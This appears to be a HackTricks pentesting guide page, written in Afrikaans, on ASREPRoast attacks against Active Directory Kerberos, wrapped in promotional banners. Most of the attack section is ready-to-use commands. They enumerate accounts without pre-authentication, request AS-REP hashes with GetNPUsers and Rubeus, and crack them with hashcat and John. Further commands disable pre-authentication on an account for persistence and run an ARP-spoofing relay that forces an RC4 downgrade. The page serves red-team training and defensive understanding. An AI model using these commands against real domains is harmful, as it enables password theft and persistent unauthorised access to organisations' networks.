# ASREPRoast

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en bug bounty jagters!

**Hacking Inligting**\
Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek

**Regte Tyd Hack Nuus**\
Bly op hoogte van die vinnige hacking wêreld deur middel van regte tyd nuus en insigte

**Laaste Aankondigings**\
Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## ASREPRoast

ASREPRoast is 'n sekuriteitsaanval wat gebruikers teiken wat die **Kerberos voor-sertifisering vereiste attribuut** ontbreek. Essensieel laat hierdie kwesbaarheid aanvallers toe om sertifisering vir 'n gebruiker van die Domeinbeheerder (DC) aan te vra sonder om die gebruiker se wagwoord te benodig. Die DC antwoord dan met 'n boodskap wat geënkripteer is met die gebruiker se wagwoord-afgeleide sleutel, wat aanvallers kan probeer om offline te kraak om die gebruiker se wagwoord te ontdek.

Die hoofvereistes vir hierdie aanval is:

* **Gebrek aan Kerberos voor-sertifisering**: Teiken gebruikers mag nie hierdie sekuriteitskenmerk geaktiveer hê nie.
* **Verbinding met die Domeinbeheerder (DC)**: Aanvallers het toegang tot die DC nodig om versoeke te stuur en geënkripteerde boodskappe te ontvang.
* **Opsionele domeinrekening**: Om 'n domeinrekening te hê, laat aanvallers toe om kwesbare gebruikers meer doeltreffend te identifiseer deur middel van LDAP-vrae. Sonder so 'n rekening moet aanvallers gebruikersname raai.

#### Enumerering van kwesbare gebruikers (het domein kredensiale nodig)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Gebruik van Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### Versoek AS\_REP boodskap

{% code title="Gebruik Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Gebruik van Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting met Rubeus sal 'n 4768 genereer met 'n versleuteling tipe van 0x17 en preauth tipe van 0.
{% endhint %}

### Kraking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Volharding

Force **preauth** nie vereis vir 'n gebruiker waar jy **GenericAll** toestemmings het (of toestemmings om eienskappe te skryf):

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Gebruik van Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast sonder geloofsbriewe

'n Aanvaller kan 'n man-in-the-middle posisie gebruik om AS-REP pakkette te vang terwyl hulle deur die netwerk beweeg sonder om op Kerberos voor-authentisering staat te maak om gedeaktiveer te wees. Dit werk dus vir alle gebruikers op die VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) laat ons dit doen. Boonop dwing die hulpmiddel kliënt werkstasies om RC4 te gebruik deur die Kerberos onderhandeling te verander.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Verwysings

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!

**Hacking Inligting**\
Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek

**Regte Tyd Hack Nuus**\
Bly op hoogte van die vinnig bewegende hacking wêreld deur middel van regte tyd nuus en insigte

**Laaste Aankondigings**\
Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
